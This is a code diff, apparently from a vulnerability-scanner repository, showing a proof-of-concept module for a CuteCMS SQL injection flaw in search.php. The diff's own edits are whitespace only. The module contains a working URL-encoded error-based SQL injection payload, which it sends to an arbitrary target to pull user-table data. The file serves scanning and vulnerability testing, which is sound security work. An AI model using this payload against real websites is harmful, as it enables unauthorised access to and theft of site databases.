@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CuteCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'CuteCMS_0001'  # 平台漏洞编号，留空
     name = 'CuteCMS 注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-01-15'  # 漏洞公布时间
     desc = '''
         CuteCMS是基于PHP+MYSQL的网站内容管理系统，系统早期开始于2003年，作者一直套用这个系统开发了几百个网站系统，同时系统也不断在实践中完善。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'CuteCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7923e6ea-d9ea-4e8c-b7c1-287dc3d90fbe'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/search.php?c=5&hit=1&s=%27and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20concat%28md5(c)%29%20from%20tcylnet_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27'
             url = self.target + payload
             r = requests.get(url)
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
